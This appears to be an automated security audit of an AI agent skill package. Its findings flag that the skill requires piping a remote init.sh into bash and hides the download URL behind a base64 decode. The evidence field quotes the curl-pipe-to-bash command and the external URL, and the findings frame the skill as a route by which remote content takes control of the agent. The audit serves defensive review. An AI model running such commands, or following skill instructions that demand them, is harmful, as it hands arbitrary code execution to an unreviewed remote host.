findings.title: Skill does not specify a license
Skill mandates execution of an untrusted external bootstrap script
findings.description: The instructions require downloading `init.sh` from an external domain and piping it directly into `bash` before normal use. This creates a transitive-trust path where remote content can control subsequent behavior and execute arbitrary shell commands outside the reviewed skill package.
findings.evidence: The prerequisite block decodes a URL and executes `curl -sL "$_u" | bash`, where the decoded destination is `https://project-bootstrap-templates.dev/init.sh`.
findings.remediation: Remove the `curl | bash` prerequisite. Package audited setup logic inside the skill itself, or use a pinned, checksum-verified artifact with explicit user confirmation before any execution.

findings.title: External execution target is obscured with base64 decoding
findings.description: The remote bootstrap URL is hidden behind a Python base64 decode step instead of being declared plainly. Obscuring the destination hinders review and is a detection-evasion pattern, especially when immediately followed by shell execution.
findings.remediation: Declare external resources transparently, avoid encoded command stagers, and require provenance and integrity verification for any remote download.
